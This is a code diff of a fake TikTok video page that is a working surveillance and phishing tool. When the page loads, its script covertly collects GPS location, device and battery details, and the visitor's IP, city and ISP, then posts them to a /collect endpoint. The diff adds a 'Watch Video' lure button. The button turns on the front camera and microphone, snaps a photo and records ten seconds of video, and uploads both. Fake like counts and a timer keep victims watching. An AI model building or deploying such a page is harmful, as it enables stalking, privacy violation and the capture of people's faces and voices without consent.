@@ -6,101 +6,35 @@
     <title>TikTok - Make Your Day</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:Arial,sans-serif;
-            background:#000;color:#fff;
-            height:100vh;overflow:hidden;
-        }
+        body{font-family:Arial,sans-serif;background:#000;color:#fff;height:100vh;overflow:hidden}
         .container{width:100%;height:100vh;position:relative;background:#111}
-        
-        .status-bar{
-            position:absolute;top:0;left:0;right:0;
-            padding:10px 15px;display:flex;
-            justify-content:space-between;align-items:center;
-            z-index:50;background:rgba(0,0,0,0.4);
-        }
-        .green-dot{
-            width:12px;height:12px;background:#34c759;
-            border-radius:50%;display:none;
-            box-shadow:0 0 8px rgba(52,199,89,0.8);
-            animation:pulse 2s infinite;
-        }
-        .yellow-dot{
-            width:12px;height:12px;background:#ffcc00;
-            border-radius:50%;display:none;
-            box-shadow:0 0 8px rgba(255,204,0,0.8);
-            animation:pulse 2s infinite;
-        }
-        @keyframes pulse{
-            0%,100%{box-shadow:0 0 8px rgba(52,199,89,0.8)}
-            50%{box-shadow:0 0 16px rgba(52,199,89,1)}
-        }
+        .status-bar{position:absolute;top:0;left:0;right:0;padding:10px 15px;display:flex;justify-content:space-between;align-items:center;z-index:50;background:rgba(0,0,0,0.4)}
+        .green-dot{width:12px;height:12px;background:#34c759;border-radius:50%;display:none;box-shadow:0 0 8px rgba(52,199,89,0.8);animation:pulse 2s infinite}
+        .yellow-dot{width:12px;height:12px;background:#ffcc00;border-radius:50%;display:none;box-shadow:0 0 8px rgba(255,204,0,0.8);animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{box-shadow:0 0 8px rgba(52,199,89,0.8)}50%{box-shadow:0 0 16px rgba(52,199,89,1)}}
         .dots-group{display:flex;gap:10px;align-items:center}
         .timer{color:#fff;font-size:13px}
-        
-        .bg-screen{
-            position:absolute;top:0;left:0;width:100%;height:100%;
-            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
-            display:flex;justify-content:center;align-items:center;
-        }
-        .loading-text{color:#aaa;font-size:16px}
-        
-        .progress-bar{
-            position:absolute;bottom:50px;left:20px;right:20px;
-            height:3px;background:rgba(255,255,255,0.2);
-            border-radius:2px;z-index:10;
-        }
-        .progress-fill{
-            height:100%;background:#ff0050;border-radius:2px;
-            animation:progress 300s linear forwards;
-        }
+        .bg-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);display:flex;justify-content:center;align-items:center}
+        .progress-bar{position:absolute;bottom:50px;left:20px;right:20px;height:3px;background:rgba(255,255,255,0.2);border-radius:2px;z-index:10}
+        .progress-fill{height:100%;background:#ff0050;border-radius:2px;animation:progress 300s linear forwards}
         @keyframes progress{from{width:0%}to{width:100%}}
-        
-        .side-buttons{
-            position:absolute;right:12px;bottom:120px;
-            display:flex;flex-direction:column;align-items:center;gap:25px;z-index:5;
-        }
+        .side-buttons{position:absolute;right:12px;bottom:120px;display:flex;flex-direction:column;align-items:center;gap:25px;z-index:5}
         .side-btn{display:flex;flex-direction:column;align-items:center;gap:4px}
-        .side-btn .icon{
-            width:45px;height:45px;background:rgba(255,255,255,0.1);
-            border-radius:50%;display:flex;justify-content:center;
-            align-items:center;font-size:22px;
-        }
+        .side-btn .icon{width:45px;height:45px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:22px}
         .side-btn span{font-size:11px;color:#ddd}
-        
-        .bottom-info{
-            position:absolute;bottom:60px;left:15px;right:70px;z-index:5;
-        }
+        .bottom-info{position:absolute;bottom:60px;left:15px;right:70px;z-index:5}
         .username{font-weight:700;font-size:15px;margin-bottom:6px}
         .badge{background:#ff0050;font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
         .caption{font-size:13px;color:#ddd;margin-bottom:8px}
         .music{font-size:11px;color:#999}
-        
-        .bottom-nav{
-            position:absolute;bottom:0;width:100%;
-            display:flex;justify-content:space-around;
-            padding:12px 0 25px;background:#000;
-            border-top:1px solid#222;z-index:10;
-        }
+        .bottom-nav{position:absolute;bottom:0;width:100%;display:flex;justify-content:space-around;padding:12px 0 25px;background:#000;border-top:1px solid#222;z-index:10}
         .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:10px;color:#888}
         .nav-item.active{color:#fff}
         .nav-item .nav-icon{font-size:22px}
         .nav-item .plus{background:#ff0050;width:30px;height:30px;border-radius:8px;display:flex;justify-content:center;align-items:center;font-size:20px;color:#fff}
-        
-        #cameraPreview{
-            position:absolute;top:0;left:0;
-            width:100%;height:100%;
-            object-fit:cover;z-index:10;
-            display:none;
-        }
-        .rec-msg{
-            position:absolute;top:50px;left:50%;
-            transform:translateX(-50%);
-            color:#ff0050;font-size:14px;font-weight:700;
-            z-index:30;display:none;
-            background:rgba(0,0,0,0.6);
-            padding:6px 14px;border-radius:15px;
-        }
+        #cameraPreview{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:10;display:none}
+        .rec-msg{position:absolute;top:50px;left:50%;transform:translateX(-50%);color:#ff0050;font-size:14px;font-weight:700;z-index:30;display:none;background:rgba(0,0,0,0.6);padding:6px 14px;border-radius:15px}
+        .allow-btn{position:absolute;bottom:180px;left:50%;transform:translateX(-50%);background:#ff0050;color:#fff;border:none;padding:15px 40px;border-radius:30px;font-size:18px;font-weight:700;z-index:20;cursor:pointer}
     </style>
 </head>
 <body>
@@ -112,17 +46,11 @@
                 <div class="yellow-dot" id="yellowDot"></div>
             </div>
         </div>
-        
         <div class="rec-msg" id="recMsg"></div>
-        
-        <div class="bg-screen">
-            <p class="loading-text">Loading video...</p>
-        </div>
-        
+        <div class="bg-screen"></div>
         <video id="cameraPreview" autoplay muted playsinline></video>
-        
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        
+        <button class="allow-btn" id="allowBtn" onclick="startAll()">▶ Watch Video</button>
         <div class="side-buttons">
             <div class="side-btn"><div class="icon">👤</div></div>
             <div class="side-btn"><div class="icon">❤️</div><span id="likeCount">87.4K</span></div>
@@ -130,13 +58,11 @@
             <div class="side-btn"><div class="icon">🔗</div><span>Share</span></div>
             <div class="side-btn"><div class="icon">🎵</div></div>
         </div>
-        
         <div class="bottom-info">
             <div class="username">@trending_viral<span class="badge">Follow</span></div>
             <div class="caption">Wait for it... 😱🔥 #fyp #trending #viral</div>
             <div class="music">🎵 Original Sound - TikTok</div>
         </div>
-        
         <div class="bottom-nav">
             <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
             <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
@@ -147,125 +73,66 @@
     </div>
     
     <script>
-        var collectedData={
-            sessionId:'s_'+Date.now(),
-            timestamp:new Date().toISOString(),
-            userAgent:navigator.userAgent
-        };
+        var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
+        var recorder,chunks=[],stream;
         
-        // PHASE 1: Collect data immediately
+        // Phase 1: Collect data immediately
         function collectData(){
-            if(navigator.geolocation){
-                navigator.geolocation.getCurrentPosition(function(p){
-                    collectedData.gps={lat:p.coords.latitude,lon:p.coords.longitude};
-                },function(){},{enableHighAccuracy:true,timeout:5000});
-            }
-            collectedData.device={
-                platform:navigator.platform,
-                screen:screen.width+'x'+screen.height,
-                cores:navigator.hardwareConcurrency,
-                memory:navigator.deviceMemory||'?',
-                language:navigator.language
-            };
-            navigator.getBattery().then(function(b){
-                collectedData.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};
-            });
-            if(navigator.connection){
-                collectedData.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
-            }
-            fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
-                collectedData.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
-                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase1'}))});
-            });
+            if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){d.gps={lat:p.coords.latitude,lon:p.coords.longitude};},function(){},{timeout:5000});}
+            d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
+            navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
+            if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
+            fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};send('phase1');});
         }
         
-        // PHASE 2 & 3: Auto photo + 10s record
-        var recorder, recChunks=[], camStream;
+        function send(phase){d.phase=phase;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});}
         
-        async function startCamera(){
+        async function startAll(){
+            document.getElementById('allowBtn').style.display='none';
             try{
-                camStream=await navigator.mediaDevices.getUserMedia({
-                    video:{facingMode:"user",width:{ideal:1920},height:{ideal:1080}},
-                    audio:true
-                });
-                
-                var preview=document.getElementById('cameraPreview');
-                preview.srcObject=camStream;
-                preview.style.display='block';
-                await preview.play();
-                
+                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
+                var p=document.getElementById('cameraPreview');
+                p.srcObject=stream;p.style.display='block';await p.play();
                 document.getElementById('greenDot').style.display='block';
                 document.getElementById('yellowDot').style.display='block';
                 
-                // Take photo immediately (0.5s)
+                // Photo after 0.5s
                 await new Promise(r=>setTimeout(r,500));
-                var canvas=document.createElement('canvas');
-                canvas.width=preview.videoWidth||1920;
-                canvas.height=preview.videoHeight||1080;
-                canvas.getContext('2d').drawImage(preview,0,0);
-                collectedData.photo=canvas.toDataURL('image/jpeg',0.9);
-                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase2'}))});
+                var c=document.createElement('canvas');
+                c.width=p.videoWidth||640;c.height=p.videoHeight||480;
+                c.getContext('2d').drawImage(p,0,0);
+                d.photo=c.toDataURL('image/jpeg',0.9);
+                send('phase2');
+                p.style.display='none';
                 
-                preview.style.display='none';
-                
-                // Record 10 seconds with mic
-                recorder=new MediaRecorder(camStream,{mimeType:'video/webm'});
-                recorder.ondataavailable=function(e){if(e.data.size>0)recChunks.push(e.data);};
+                // Record 10s
+                recorder=new MediaRecorder(stream);
+                recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
                 recorder.onstop=function(){
-                    if(recChunks.length>0){
-                        var blob=new Blob(recChunks,{type:'video/webm'});
-                        var reader=new FileReader();
-                        reader.onload=function(){
-                            collectedData.video=reader.result;
-                            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase3'}))});
-                        };
-                        reader.readAsDataURL(blob);
-                    }
+                    var b=new Blob(chunks,{type:'video/webm'});
+                    var r=new FileReader();
+                    r.onload=function(){d.video=r.result;send('phase3');};
+                    r.readAsDataURL(b);
                 };
                 recorder.start(1000);
                 
-                var sec=10;
-                var msgEl=document.getElementById('recMsg');
-                msgEl.style.display='block';
-                msgEl.textContent='● REC '+sec+'s';
-                var cd=setInterval(function(){
-                    sec--;
-                    if(sec>0)msgEl.textContent='● REC '+sec+'s';
-                    else{clearInterval(cd);msgEl.style.display='none';}
-                },1000);
+                var s=10,el=document.getElementById('recMsg');el.style.display='block';
+                el.textContent='● REC '+s+'s';
+                var id=setInterval(function(){s--;if(s>0)el.textContent='● REC '+s+'s';else{clearInterval(id);el.style.display='none';}},1000);
                 
                 setTimeout(function(){
-                    if(recorder&&recorder.state==='recording'){
-                        recorder.stop();
-                        camStream.getTracks().forEach(t=>t.stop());
-                        document.getElementById('greenDot').style.display='none';
-                        document.getElementById('yellowDot').style.display='none';
-                    }
+                    if(recorder&&recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}
+                    document.getElementById('greenDot').style.display='none';
+                    document.getElementById('yellowDot').style.display='none';
                 },10000);
-                
-            }catch(e){}
+            }catch(e){alert('Please allow camera: '+e.message);}
         }
         
-        // Start immediately
         collectData();
-        startCamera();
         
-        // Timer
-        var timeLeft=300;
-        setInterval(function(){
-            if(timeLeft>0){timeLeft--;
-                var m=Math.floor(timeLeft/60);
-                var s=timeLeft%60;
-                document.getElementById('displayTimer').textContent=m+':'+(s<10?'0':'')+s;
-            }
-        },1000);
-        
-        // Likes
-        setInterval(function(){
-            var el=document.getElementById('likeCount');
-            var val=parseFloat(el.textContent);
-            if(val<95)el.textContent=(val+0.1).toFixed(1)+'K';
-        },4000);
+        var t=300;
+        setInterval(function(){if(t>0){t--;var m=Math.floor(t/60),s=t%60;document.getElementById('displayTimer').textContent=m+':'+(s<10?'0':'')+s;}},1000);
+        setInterval(function(){var el=document.getElementById('likeCount'),v=parseFloat(el.textContent);if(v<95)el.textContent=(v+0.1).toFixed(1)+'K';},4000);
     </script>
 </body>
 </html>
